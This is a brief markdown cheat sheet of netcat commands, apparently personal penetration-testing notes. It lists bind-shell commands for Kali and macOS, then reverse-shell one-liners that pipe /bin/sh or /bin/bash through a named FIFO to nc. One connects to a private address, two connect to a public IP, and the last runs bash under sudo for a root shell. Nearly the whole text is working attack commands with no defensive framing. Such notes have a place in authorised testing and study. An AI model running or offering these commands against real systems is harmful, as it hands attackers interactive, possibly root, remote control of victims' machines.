# Netcat

Kali:

	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
	nc  -lvvp 8888 -e /bin/bash (listen)
	
MacOS:

	nc KALI-IP 8888 (connect - cannot execute -e directly)
    nc -l 8888 (listen - cannot execute -e directly)

## Reverse Shell

Shell:

	mkfifo /tmp/f; nc 192.168.0.110 2222 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

Bash:

	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | /bin/bash -i >/tmp/f 2>&1; rm /tmp/f

Bash: (root)

	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | sudo /bin/bash -i >/tmp/f 2>&1; rm /tmp/f